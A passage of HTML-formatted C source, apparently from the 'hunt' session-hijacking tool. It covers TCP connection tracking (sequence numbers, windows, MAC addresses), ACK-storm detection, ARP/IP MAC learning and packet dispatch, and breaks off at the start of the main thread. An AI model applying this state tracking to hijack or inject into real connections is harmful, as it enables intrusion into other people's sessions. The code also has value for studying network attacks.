<br><font color="#3333FF">&nbsp;struct packet_info *pi;</font>
<p><font color="#3333FF">&nbsp;list_iter_set(&amp;iter, &amp;l_skip_update);</font>
<br><font color="#3333FF">&nbsp;while ((pi = list_iter_get(&amp;iter)))
{</font>
<br><font color="#3333FF">&nbsp; if (packet_match(pi, p)) {</font>
<br><font color="#3333FF">&nbsp;&nbsp; list_iter_end(&amp;iter);</font>
<br><font color="#3333FF">&nbsp;&nbsp; list_remove(&amp;l_skip_update,
pi);</font>
<br><font color="#3333FF">&nbsp;&nbsp; return 1;</font>
<br><font color="#3333FF">&nbsp; }</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">&nbsp;list_iter_end(&amp;iter);</font>
<br><font color="#3333FF">&nbsp;return 0;</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">static void __conn_add(struct packet *p, unsigned
int key)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;struct iphdr *iph = p->p_iph;</font>
<br><font color="#3333FF">&nbsp;struct tcphdr *tcph = p->p_hdr.p_tcph;</font>
<br><font color="#3333FF">&nbsp;struct conn_info *ci;</font>
<br><font color="#3333FF">&nbsp;struct host_info *h_src, *h_dst;</font>
<p><font color="#3333FF">&nbsp;ci = malloc(sizeof(struct conn_info));</font>
<br><font color="#3333FF">&nbsp;assert(ci);</font>
<br><font color="#3333FF">&nbsp;memset(ci, 0, sizeof(struct conn_info));</font>
<br><font color="#3333FF">&nbsp;ci->use_count = 1;</font>
<br><font color="#3333FF">&nbsp;pthread_mutex_init(&amp;ci->mutex, NULL);</font>
<p><font color="#3333FF">&nbsp;if (ntohs(tcph->dest) >= 1024 &amp;&amp;
ntohs(tcph->source) &lt; 1024) {</font>
<br><font color="#3333FF">&nbsp; ci->src_addr = iph->daddr;</font>
<br><font color="#3333FF">&nbsp; ci->dst_addr = iph->saddr;</font>
<br><font color="#3333FF">&nbsp; ci->src_port = tcph->dest;</font>
<br><font color="#3333FF">&nbsp; ci->dst_port = tcph->source;</font>
<br><font color="#3333FF">&nbsp; h_src = &amp;ci->dst;</font>
<br><font color="#3333FF">&nbsp; h_dst = &amp;ci->src;</font>
<br><font color="#3333FF">&nbsp;} else {</font>
<br><font color="#3333FF">&nbsp; ci->src_addr = iph->saddr;</font>
<br><font color="#3333FF">&nbsp; ci->dst_addr = iph->daddr;</font>
<br><font color="#3333FF">&nbsp; ci->src_port = tcph->source;</font>
<br><font color="#3333FF">&nbsp; ci->dst_port = tcph->dest;</font>
<br><font color="#3333FF">&nbsp; h_src = &amp;ci->src;</font>
<br><font color="#3333FF">&nbsp; h_dst = &amp;ci->dst;</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">&nbsp;h_src->next_seq = htonl(ntohl(tcph->seq)
+ p->p_data_len +</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; tcph->syn ? 1 : 0);</font>
<br><font color="#3333FF">&nbsp;if (tcph->ack)</font>
<br><font color="#3333FF">&nbsp; h_src->next_d_seq = tcph->ack_seq;</font>
<br><font color="#3333FF">&nbsp;h_src->window = tcph->window;</font>
<br><font color="#3333FF">&nbsp;h_src->id = iph->id;</font>
<br><font color="#3333FF">&nbsp;memcpy(h_src->dst_mac, p->p_ethh->h_dest,
ETH_ALEN);</font>
<br><font color="#3333FF">&nbsp;memcpy(h_src->src_mac, p->p_ethh->h_source,
ETH_ALEN);</font>
<p><font color="#3333FF">&nbsp;/* guess or try to fill h_dst too */</font>
<br><font color="#3333FF">&nbsp;h_dst->next_seq = h_src->next_d_seq;</font>
<br><font color="#3333FF">&nbsp;h_dst->next_d_seq = h_src->next_seq;</font>
<br><font color="#3333FF">&nbsp;h_dst->window = tcph->window;</font>
<br><font color="#3333FF">&nbsp;h_dst->id = iph->id;</font>
<br><font color="#3333FF">&nbsp;memcpy(h_dst->dst_mac, h_src->src_mac,
ETH_ALEN);</font>
<br><font color="#3333FF">&nbsp;memcpy(h_dst->src_mac, h_src->dst_mac,
ETH_ALEN);</font>
<p><font color="#3333FF">&nbsp;hash_put(&amp;conn_table, key, ci);</font>
<p><font color="#3333FF">&nbsp;print_new_conn_ind(1);</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">static void ack_storm_notify(struct conn_info
*ci, struct user_conn_info *uci)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;struct timeval tv;</font>
<br><font color="#3333FF">&nbsp;int print_it = 0;</font>
<p><font color="#3333FF">&nbsp;if (!ci->ack_storm_notify_sec) {</font>
<br><font color="#3333FF">&nbsp; gettimeofday(&amp;tv, NULL);</font>
<br><font color="#3333FF">&nbsp; print_it = 1;</font>
<br><font color="#3333FF">&nbsp;} else {</font>
<br><font color="#3333FF">&nbsp; gettimeofday(&amp;tv, NULL);</font>
<br><font color="#3333FF">&nbsp; if (tv.tv_sec - ci->ack_storm_notify_sec
>= 10)</font>
<br><font color="#3333FF">&nbsp;&nbsp; print_it = 1;</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">&nbsp;if (print_it) {</font>
<br><font color="#3333FF">&nbsp; set_tty_color(COLOR_BRIGHTRED);</font>
<br><font color="#3333FF">&nbsp; printf("\nhunt: possible ACK storm: ");</font>
<br><font color="#3333FF">&nbsp; print_user_conn_info(uci, 1);</font>
<br><font color="#3333FF">&nbsp; set_tty_color(COLOR_LIGHTGRAY);</font>
<br><font color="#3333FF">&nbsp; ci->ack_storm_notify_sec = tv.tv_sec;</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">static void conn_add_update(struct packet *p)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;static struct user_conn_info last_toadd
= {0, 0, 0, 0};</font>
<br><font color="#3333FF">&nbsp;static int last_count = 0;</font>
<br><font color="#3333FF">&nbsp;unsigned int key;</font>
<br><font color="#3333FF">&nbsp;struct conn_info *ci;</font>
<br><font color="#3333FF">&nbsp;struct user_conn_info uci;</font>
<br><font color="#3333FF">&nbsp;unsigned int old_next_d_seq;</font>
<p><font color="#3333FF">&nbsp;fill_uci(&amp;uci, p);</font>
<br><font color="#3333FF">&nbsp;key = uci_generate_key(&amp;uci);</font>
<p><font color="#3333FF">&nbsp;hash_lock(&amp;conn_table);</font>
<br><font color="#3333FF">&nbsp;if ((ci = hash_get(&amp;conn_table, key,
&amp;uci)) &amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; ht_eq(key, ci, &amp;uci)
== 1) {</font>
<br><font color="#3333FF">&nbsp; if (!conn_skip_update(ci, p)) {</font>
<br><font color="#3333FF">&nbsp;&nbsp; struct host_info *h_src, *h_dst;</font>
<br><font color="#3333FF">&nbsp;&nbsp; struct iphdr *iph = p->p_iph;</font>
<br><font color="#3333FF">&nbsp;&nbsp; struct tcphdr *tcph = p->p_hdr.p_tcph;</font>
<p><font color="#3333FF">&nbsp;&nbsp; if (ci->src_addr == iph->saddr &amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ci->dst_addr
== iph->daddr &amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ci->src_port
== tcph->source &amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ci->dst_port
== tcph->dest) {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; h_src = &amp;ci->src;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; h_dst = &amp;ci->dst;</font>
<br><font color="#3333FF">&nbsp;&nbsp; } else {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; h_src = &amp;ci->dst;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; h_dst = &amp;ci->src;</font>
<br><font color="#3333FF">&nbsp;&nbsp; }</font>
<br><font color="#3333FF">&nbsp;&nbsp; old_next_d_seq = h_src->next_d_seq;</font>
<p><font color="#3333FF">&nbsp;&nbsp; h_src->next_seq = htonl(ntohl(tcph->seq)
+</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p->p_data_len);</font>
<br><font color="#3333FF">&nbsp;&nbsp; if (tcph->ack)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; h_src->next_d_seq = tcph->ack_seq;</font>
<br><font color="#3333FF">&nbsp;&nbsp; h_src->id = iph->id; /* well, this
should be in IP updater not in TCP */</font>
<br><font color="#3333FF">&nbsp;&nbsp; h_src->window = tcph->window;</font>
<br><font color="#3333FF">&nbsp;&nbsp; /* well these can change too :-)
*/</font>
<br><font color="#3333FF">&nbsp;&nbsp; memcpy(h_src->dst_mac, p->p_ethh->h_dest,
ETH_ALEN);</font>
<br><font color="#3333FF">&nbsp;&nbsp; memcpy(h_src->src_mac, p->p_ethh->h_source,
ETH_ALEN);</font>
<br><font color="#3333FF">&nbsp;&nbsp; /*</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; * ACK storm detection</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; */</font>
<br><font color="#3333FF">&nbsp;&nbsp; h_src->delta_d_seq += ntohl(h_src->next_d_seq)
-</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ntohl(old_next_d_seq);</font>
<br><font color="#3333FF">&nbsp;&nbsp; if (++ci->update_count % 400 ==
0) {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; if (ci->src.delta_d_seq ==
0 &amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ci->dst.delta_d_seq
== 0) {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; ack_storm_notify(ci,
&amp;uci);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; } else {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; ci->src.delta_d_seq
= 0;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; ci->dst.delta_d_seq
= 0;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#3333FF">&nbsp;&nbsp; }</font>
<br><font color="#3333FF">&nbsp; }</font>
<br><font color="#3333FF">&nbsp;} else {</font>
<br><font color="#3333FF">&nbsp;&nbsp; /* test if we could add the connection
*/</font>
<br><font color="#3333FF">&nbsp; if (p->p_data_len > 0) {</font>
<br><font color="#3333FF">&nbsp;&nbsp; /*</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; * well, it contains data -
add it</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; */</font>
<br><font color="#3333FF">&nbsp;&nbsp; if (conn_add_policy(p->p_iph, p->p_hdr.p_tcph))</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; __conn_add(p, key);</font>
<br><font color="#3333FF">&nbsp; } else {</font>
<br><font color="#3333FF">&nbsp;&nbsp; /*</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; * well, check it this way
because we don't want</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; * to add RST, ACK to FIN,
... as connectinos.</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; */</font>
<br><font color="#3333FF">&nbsp;&nbsp; if ((last_toadd.src_addr == p->p_iph->saddr
&amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; last_toadd.dst_addr
== p->p_iph->daddr &amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; last_toadd.src_port
== p->p_hdr.p_tcph->source &amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; last_toadd.dst_port
== p->p_hdr.p_tcph->dest) ||</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (last_toadd.src_addr
== p->p_iph->daddr &amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; last_toadd.dst_addr
== p->p_iph->saddr &amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; last_toadd.src_port
== p->p_hdr.p_tcph->dest &amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; last_toadd.dst_port
== p->p_hdr.p_tcph->source)) {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; if (++last_count >= 10) {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; last_count = 0;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; if (conn_add_policy(p->p_iph,
p->p_hdr.p_tcph))</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; __conn_add(p,
key);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#3333FF">&nbsp;&nbsp; } else {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; last_count = 0;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; last_toadd.src_addr = p->p_iph->saddr;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; last_toadd.dst_addr = p->p_iph->daddr;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; last_toadd.src_port = p->p_hdr.p_tcph->source;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; last_toadd.dst_port = p->p_hdr.p_tcph->dest;</font>
<br><font color="#3333FF">&nbsp;&nbsp; }</font>
<br><font color="#3333FF">&nbsp; }</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">&nbsp;hash_unlock(&amp;conn_table);</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">static void conn_del(struct packet *p)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;struct conn_info *ci;</font>
<br><font color="#3333FF">&nbsp;struct user_conn_info uci;</font>
<br><font color="#3333FF">&nbsp;unsigned int key;</font>
<br><font color="#3333FF">&nbsp;int remove_it = 0;</font>
<br><font color="#3333FF">#if 0</font>
<br><font color="#3333FF">&nbsp;fill_uci(&amp;uci, p);</font>
<br><font color="#3333FF">&nbsp;key = uci_generate_key(&amp;uci);</font>
<br><font color="#3333FF">&nbsp;if ((ci = hash_remove(&amp;conn_table,
key, &amp;uci))) {</font>
<br><font color="#3333FF">&nbsp; conn_free(ci);</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">#endif</font>
<br><font color="#3333FF">&nbsp;fill_uci(&amp;uci, p);</font>
<br><font color="#3333FF">&nbsp;key = uci_generate_key(&amp;uci);</font>
<br><font color="#3333FF">&nbsp;hash_lock(&amp;conn_table);</font>
<br><font color="#3333FF">&nbsp;if ((ci = hash_get(&amp;conn_table, key,
&amp;uci)) &amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; ht_eq(key, ci, &amp;uci)
== 1) {</font>
<br><font color="#3333FF">&nbsp; if (!conn_skip_update(ci, p)) {</font>
<br><font color="#3333FF">&nbsp;&nbsp; if (p->p_iph->saddr == ci->src_addr
&amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p->p_iph->daddr
== ci->dst_addr &amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p->p_hdr.p_tcph->source
== ci->src_port &amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p->p_hdr.p_tcph->dest
== ci->dst_port) {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; /* from source to dest */</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if
(p->p_hdr.p_tcph->seq == ci->dst.next_d_seq)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; remove_it = 1;</font>
<br><font color="#3333FF">&nbsp;&nbsp; } else {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; /* from dest to source */</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; if (p->p_hdr.p_tcph->seq ==
ci->src.next_d_seq)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; remove_it = 1;</font>
<br><font color="#3333FF">&nbsp;&nbsp; }</font>
<br><font color="#3333FF">&nbsp; }</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">&nbsp;if (remove_it) {</font>
<br><font color="#3333FF">&nbsp; if (ci == hash_remove(&amp;conn_table,
key, &amp;uci))</font>
<br><font color="#3333FF">&nbsp;&nbsp; conn_free(ci);</font>
<br><font color="#3333FF">&nbsp; hash_unlock(&amp;conn_table);</font>
<br><font color="#3333FF">&nbsp;} else {</font>
<br><font color="#3333FF">&nbsp; hash_unlock(&amp;conn_table);</font>
<br><font color="#3333FF">&nbsp; conn_add_update(p);</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">static void conn_add(struct packet *p)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;struct conn_info *ci;</font>
<br><font color="#3333FF">&nbsp;struct user_conn_info uci;</font>
<br><font color="#3333FF">&nbsp;unsigned int key;</font>
<p><font color="#3333FF">&nbsp;fill_uci(&amp;uci, p);</font>
<br><font color="#3333FF">&nbsp;key = uci_generate_key(&amp;uci);</font>
<br><font color="#3333FF">&nbsp;hash_lock(&amp;conn_table);</font>
<br><font color="#3333FF">&nbsp;if ((ci = hash_get(&amp;conn_table, key,
&amp;uci)) &amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; ht_eq(key, ci, &amp;uci)
== 1) {</font>
<br><font color="#3333FF">&nbsp; conn_add_update(p);</font>
<br><font color="#3333FF">#if 0</font>
<br><font color="#3333FF">&nbsp;&nbsp; ci = hash_remove(&amp;conn_table,
key, &amp;uci);</font>
<br><font color="#3333FF">&nbsp;&nbsp; hash_unlock(&amp;conn_table);</font>
<br><font color="#3333FF">&nbsp;&nbsp; conn_free(ci);</font>
<br><font color="#3333FF">&nbsp;&nbsp; hash_lock(&amp;conn_table);</font>
<br><font color="#3333FF">#endif</font>
<br><font color="#3333FF">&nbsp;} else {</font>
<br><font color="#3333FF">&nbsp; __conn_add(p, key);</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">&nbsp;hash_unlock(&amp;conn_table);</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">static void conn_update_table(struct packet *p,
struct ethhdr *ethh, struct iphdr *iph)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;struct tcphdr *tcph = p->p_hdr.p_tcph;</font>
<p><font color="#3333FF">&nbsp;if (tcph->syn &amp;&amp; !tcph->ack) {</font>
<br><font color="#3333FF">&nbsp; if (conn_add_policy(iph, tcph)) {</font>
<br><font color="#3333FF">&nbsp;&nbsp; conn_add(p);</font>
<br><font color="#3333FF">&nbsp; }</font>
<br><font color="#3333FF">&nbsp;} else if (tcph->rst || tcph->fin) {</font>
<br><font color="#3333FF">&nbsp; #if 0</font>
<br><font color="#3333FF">&nbsp; if (conn_add_policy(iph, tcph))</font>
<br><font color="#3333FF">&nbsp; #endif</font>
<br><font color="#3333FF">&nbsp;&nbsp; conn_del(p);</font>
<br><font color="#3333FF">&nbsp;} else {</font>
<br><font color="#3333FF">&nbsp; #if 0</font>
<br><font color="#3333FF">&nbsp; if (conn_add_policy(iph, tcph))</font>
<br><font color="#3333FF">&nbsp; #endif</font>
<br><font color="#3333FF">&nbsp;&nbsp; conn_add_update(p);</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">/*</font>
<br><font color="#3333FF">&nbsp;*</font>
<br><font color="#3333FF">&nbsp;* function lists</font>
<br><font color="#3333FF">&nbsp;*</font>
<br><font color="#3333FF">&nbsp;*/</font>
<br><font color="#3333FF">static void process_tcp(struct packet *p)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;struct ifunc_item *li;</font>
<br><font color="#3333FF">&nbsp;struct list_iterator iter;</font>
<p><font color="#3333FF">&nbsp;list_iter_set(&amp;iter, &amp;l_ifunc_tcp);</font>
<br><font color="#3333FF">&nbsp;while ((li = list_iter_get(&amp;iter)))</font>
<br><font color="#3333FF">&nbsp; li->func(p, li->arg);</font>
<br><font color="#3333FF">&nbsp;list_iter_end(&amp;iter);</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">static void process_udp(struct packet *p)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;struct ifunc_item *li;</font>
<br><font color="#3333FF">&nbsp;struct list_iterator iter;</font>
<p><font color="#3333FF">&nbsp;list_iter_set(&amp;iter, &amp;l_ifunc_udp);</font>
<br><font color="#3333FF">&nbsp;while ((li = list_iter_get(&amp;iter)))</font>
<br><font color="#3333FF">&nbsp; li->func(p, li->arg);</font>
<br><font color="#3333FF">&nbsp;list_iter_end(&amp;iter);</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">static void process_icmp(struct packet *p)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;struct ifunc_item *li;</font>
<br><font color="#3333FF">&nbsp;struct list_iterator iter;</font>
<p><font color="#3333FF">&nbsp;list_iter_set(&amp;iter, &amp;l_ifunc_icmp);</font>
<br><font color="#3333FF">&nbsp;while ((li = list_iter_get(&amp;iter)))</font>
<br><font color="#3333FF">&nbsp; li->func(p, li->arg);</font>
<br><font color="#3333FF">&nbsp;list_iter_end(&amp;iter);</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">static void process_arp(struct packet *p)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;struct ifunc_item *li;</font>
<br><font color="#3333FF">&nbsp;struct list_iterator iter;</font>
<p><font color="#3333FF">&nbsp;list_iter_set(&amp;iter, &amp;l_ifunc_arp);</font>
<br><font color="#3333FF">&nbsp;while ((li = list_iter_get(&amp;iter)))</font>
<br><font color="#3333FF">&nbsp; li->func(p, li->arg);</font>
<br><font color="#3333FF">&nbsp;list_iter_end(&amp;iter);</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">static void process_ip(struct packet *p)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;struct ifunc_item *li;</font>
<br><font color="#3333FF">&nbsp;struct list_iterator iter;</font>
<p><font color="#3333FF">&nbsp;list_iter_set(&amp;iter, &amp;l_ifunc_ip);</font>
<br><font color="#3333FF">&nbsp;while ((li = list_iter_get(&amp;iter)))</font>
<br><font color="#3333FF">&nbsp; li->func(p, li->arg);</font>
<br><font color="#3333FF">&nbsp;list_iter_end(&amp;iter);</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">/*</font>
<br><font color="#3333FF">&nbsp;* sample of ifunc</font>
<br><font color="#3333FF">&nbsp;*/</font>
<br><font color="#3333FF">#if 0</font>
<br><font color="#3333FF">struct list m_packet_list = LIST_INIT(struct
packet, p_next[MODULE_NR]);</font>
<p><font color="#3333FF">void m_func_tcp(struct packet *p)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;if (want_it) {</font>
<br><font color="#3333FF">&nbsp; packet_want(p);</font>
<br><font color="#3333FF">&nbsp; list_produce(&amp;m_packet_list, p);</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">}</font>
<br><font color="#3333FF">#endif</font>
<p><font color="#3333FF">static inline void fast_tcp_process(struct packet
*p)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;struct list_iterator iter;</font>
<br><font color="#3333FF">&nbsp;struct ifunc_item *li;</font>
<p><font color="#3333FF">&nbsp;list_lock(&amp;l_ifunc_fast_tcp);</font>
<br><font color="#3333FF">&nbsp;list_iter_set(&amp;iter, &amp;l_ifunc_fast_tcp);</font>
<br><font color="#3333FF">&nbsp;while ((li = list_iter_get(&amp;iter)))</font>
<br><font color="#3333FF">&nbsp; li->func(p, li->arg);</font>
<br><font color="#3333FF">&nbsp;list_iter_end(&amp;iter);</font>
<br><font color="#3333FF">&nbsp;list_unlock(&amp;l_ifunc_fast_tcp);</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">static void mac_table_update(unsigned int ip,
char *mac)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;struct mac_info *mi;</font>
<p><font color="#3333FF">&nbsp;hash_lock(&amp;mac_table);</font>
<br><font color="#3333FF">&nbsp;if ((mi = hash_get(&amp;mac_table, ip,
NULL))) {</font>
<br><font color="#3333FF">&nbsp; if (memcmp(mi->mac, mac, sizeof(mi->mac)))
{</font>
<br><font color="#3333FF">&nbsp;&nbsp; pthread_mutex_lock(&amp;mi->mutex);</font>
<br><font color="#3333FF">&nbsp;&nbsp; memcpy(mi->mac, mac, sizeof(mi->mac));</font>
<br><font color="#3333FF">&nbsp;&nbsp; pthread_mutex_unlock(&amp;mi->mutex);</font>
<br><font color="#3333FF">&nbsp; }</font>
<br><font color="#3333FF">&nbsp;} else {</font>
<br><font color="#3333FF">&nbsp; mi = malloc(sizeof(struct mac_info));</font>
<br><font color="#3333FF">&nbsp; assert(mi);</font>
<br><font color="#3333FF">&nbsp; memcpy(mi->mac, mac, sizeof(mi->mac));</font>
<br><font color="#3333FF">&nbsp; pthread_mutex_init(&amp;mi->mutex, NULL);</font>
<br><font color="#3333FF">&nbsp; hash_put(&amp;mac_table, ip, mi);</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">&nbsp;hash_unlock(&amp;mac_table);</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">struct mac_info *mac_info_get(unsigned int ip)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;struct mac_info *mi;</font>
<p><font color="#3333FF">&nbsp;hash_lock(&amp;mac_table);</font>
<br><font color="#3333FF">&nbsp;if ((mi = hash_get(&amp;mac_table, ip,
NULL))) {</font>
<br><font color="#3333FF">&nbsp; pthread_mutex_lock(&amp;mi->mutex);</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">&nbsp;hash_unlock(&amp;mac_table);</font>
<br><font color="#3333FF">&nbsp;return mi;</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">void mac_info_release(struct mac_info *mi)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;pthread_mutex_unlock(&amp;mi->mutex);</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">static void mac_arp_learn(struct packet *p)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;unsigned int ip;</font>
<br><font color="#3333FF">&nbsp;char *mac;</font>
<br><font color="#3333FF">&nbsp;struct arpeth_hdr *arpethh;</font>
<p><font color="#3333FF">&nbsp;arpethh = (struct arpeth_hdr *)(p->p_arph
+ 1);</font>
<p><font color="#3333FF">&nbsp;if (p->p_arph->ar_op == htons(ARPOP_REPLY)
||</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; p->p_arph->ar_op ==
htons(ARPOP_REQUEST)) {</font>
<br><font color="#3333FF">&nbsp; ip = *(unsigned int *) arpethh->ar_sip;</font>
<br><font color="#3333FF">&nbsp; mac = arpethh->ar_sha;</font>
<br><font color="#3333FF">&nbsp; if (memcmp(mac, p->p_ethh->h_source, ETH_ALEN)
== 0)</font>
<br><font color="#3333FF">&nbsp;&nbsp; mac_table_update(ip, mac);</font>
<br><font color="#3333FF">&nbsp; else</font>
<br><font color="#3333FF">&nbsp;&nbsp; fprintf(stderr, "ARP: MAC src !=
ARP src for host %s\n", host_lookup(ip, hl_mode));</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">static void mac_ip_learn(struct packet *p)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;unsigned int ip;</font>
<br><font color="#3333FF">&nbsp;char *mac;</font>
<p><font color="#3333FF">&nbsp;ip = p->p_iph->saddr;</font>
<br><font color="#3333FF">&nbsp;mac = p->p_ethh->h_source;</font>
<br><font color="#3333FF">&nbsp;mac_table_update(ip, mac);</font>
<br><font color="#3333FF">&nbsp;/*</font>
<br><font color="#3333FF">&nbsp; * well, don't learn mac addresses from
dst as they can be spoofed</font>
<br><font color="#3333FF">&nbsp; * (even though check can be made)</font>
<br><font color="#3333FF">&nbsp; */</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">/*</font>
<br><font color="#3333FF">&nbsp;*</font>
<br><font color="#3333FF">&nbsp;* hunt</font>
<br><font color="#3333FF">&nbsp;*</font>
<br><font color="#3333FF">&nbsp;*/</font>
<br><font color="#3333FF">unsigned int pkts_received = 0;</font>
<br><font color="#3333FF">unsigned int pkts_dropped = 0;</font>
<br><font color="#3333FF">unsigned int pkts_unhandled = 0;</font>
<br><font color="#3333FF">unsigned int bytes_received = 0;</font>
<p><font color="#3333FF">void *hunt(void *arg)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;struct packet *p;</font>
